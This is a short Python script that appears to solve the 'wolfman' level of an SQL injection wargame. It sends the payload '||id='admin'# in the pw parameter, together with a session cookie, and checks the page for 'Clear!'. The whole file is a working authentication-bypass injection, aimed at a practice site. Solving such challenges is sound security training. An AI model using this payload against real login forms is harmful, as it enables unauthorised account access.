from requests import get

url ="https://los.rubiya.kr/chall/wolfman_4fdc56b75971e41981e3d1e2fbe9b7f7.php"
cookie = {"PHPSESSID":"c0bed5cfkoofgp0l3nfhdr2c89"}
params = {
    "pw":"'||id='admin'#"
}

if get(url,params=params,cookies=cookie).text.find("Clear!") > 0:
    print("[*] Success")
